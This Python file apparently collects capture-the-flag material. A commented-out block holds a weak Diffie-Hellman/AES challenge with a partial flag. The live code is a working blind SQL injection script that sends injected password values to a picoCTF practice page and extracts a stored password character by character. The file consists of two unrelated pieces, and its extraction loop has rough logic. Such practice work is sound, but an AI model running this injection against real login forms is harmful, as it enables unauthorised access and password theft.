'''import random
from Crypto.Cipher import AES

# generate key
gpList = [ [13, 19], [7, 17], [3, 31], [13, 19], [17, 23], [2, 29] ]
g, p = random.choice(gpList)
a = random.randint(1, p)
b = random.randint(1, p)
k = pow(g, a * b, p)
k = str(k)

# print("Diffie-Hellman key exchange outputs")
# print("Public key: ", g, p)
# print("Jotaro sends: ", aNum)
# print("Dio sends: ", bNum)
# print()

# pad key to 16 bytes (128bit)
key = ""
i = 0
padding = "uiuctf2021uiuctf2021"
while (16 - len(key) != len(k)):
    key = key + padding[i]
    i += 1
key = key + k
key = bytes(key, encoding='ascii')


flag = 'UIUCTF{'

iv = bytes("kono DIO daaaaaa", encoding = 'ascii')
cipher = AES.new(key, AES.MODE_CFB, iv)
ciphertext = cipher.encrypt(flag)

print(ciphertext.hex())
zz = b'\xafaNt\xf3\x0e'
#print(ascii())
'''
import requests
from string import printable
accum = ""
for i in range(40):
  for letter in printable:
    accum += letter
    r = requests.post("http://primer.picoctf.com/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
    + letter+"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
    if 'NOTHING FOUND...' in r.text:
      accum = accum[:-1]
      print("nope")
    else:
      print(f"We found the character: {letter}")
print(accum)